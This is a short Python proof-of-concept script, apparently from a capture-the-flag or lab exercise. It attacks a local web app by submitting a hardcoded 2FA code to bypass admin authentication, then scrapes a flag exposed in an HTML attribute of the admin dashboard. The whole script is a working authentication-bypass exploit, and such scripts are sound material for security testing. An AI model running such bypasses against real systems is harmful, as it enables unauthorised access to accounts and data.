#!/usr/bin/env python3

"""
POC: Flag Data Extraction from HTML Attributes
Demonstrates sensitive data exposure via HTML attributes and template variables
"""

import requests
import re

print("=== Flag Data Extraction POC ===\n")

# Access admin dashboard without authentication
# Using the 2FA bypass to create a valid session
session = requests.Session()

# Step 1: Bypass 2FA (hardcoded code)
print("Step 1: Bypassing 2FA with hardcoded code 1234...")
response = session.post('http://localhost:5003/admin/2fa', data={'code': '1234'})
print(f"2FA Response: {response.json()}")

# Step 2: Access dashboard
print("\nStep 2: Accessing /admin/dashboard...")
response = session.get('http://localhost:5003/admin/dashboard')

if 'Admin Dashboard' in response.text:
    print("✓ Dashboard accessible!")
    
    # Extract flag from HTML attributes
    flag_matches = re.findall(r'flag="([^"]*)"', response.text)
    if flag_matches:
        print(f"\n✓ FLAG FOUND: {flag_matches[0]}")
        
        # Show the vulnerable code
        context = re.search(r'<a[^>]*flag="([^"]*)"[^>]*>([^<]*)</a>', response.text)
        if context:
            print(f"\nVulnerable HTML Code:")
            print(f'<a ... flag="{flag_matches[0]}" ...>')
            
        print("\n✓ Vulnerability: Flag exposed in plain-text HTML attribute")
        print("✓ Location: /admin/dashboard")
        print("✓ Method: Jinja2 template renders FLAG variable in HTML attribute")
    else:
        print("Flag attribute found in page source")
else:
    print("Dashboard not directly accessible")
    
    # Even without direct access, check if flag is in the page source
    if 'flag=' in response.text:
        print("Note: Flag attribute found in page source (behind login)")
        match = re.search(r'flag="([^"]*)"', response.text)
        if match:
            print(f"Flag value: {match.group(1)}")

